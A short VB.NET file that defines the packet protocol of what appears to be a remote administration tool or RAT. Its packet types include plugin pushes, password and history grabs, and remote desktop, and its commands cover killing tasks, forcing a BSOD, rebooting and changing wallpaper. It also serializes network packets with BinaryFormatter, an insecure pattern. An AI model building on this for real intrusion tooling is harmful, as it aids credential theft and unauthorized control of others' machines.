Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary

Public Class Packet
    <Serializable()>
    Public Class PacketMaker
        Public Property Plugin As Byte()
        Public Property Type_Packet As PacketType
        Public Property File_Name As String
        Public Property Function_Params As Object()
        Public Property Misc As Object()
    End Class

    Public Enum PacketType As Integer
        MSG = &H5057
        File = &H5056
        PLUGIN = &H0
        ID = &H1
        PW = &H3
        HIST = &H4
        W_PW = &H5
        TASKS = &H6
        RD = &H7
    End Enum

    Public Enum Packet_Subject
        RETRIEVE_TASKS = &H199
        KILL_TASK = &H200
        RESUME_TASK = &H201
        PAUSE_TASK = &H202


        LOG_OUT = &H300
        REBOOT = &H301
        SHUTDOWN = &H302
        BSOD = &H304
        WALLPAPER = &H305
        SUSPEND = &H306
        HIBERNATE = &H307
        MUTE_SOUND = &H308
        VOL_UP = &H309
        VOL_DOWN = &H310
    End Enum

    Public Class Packet_Send
        Public Property Packet As PacketMaker

        Public Sub Send(ByVal N As NetworkStream)
            Dim B As New BinaryFormatter

            B.Serialize(N, Packet)
        End Sub
    End Class


End Class
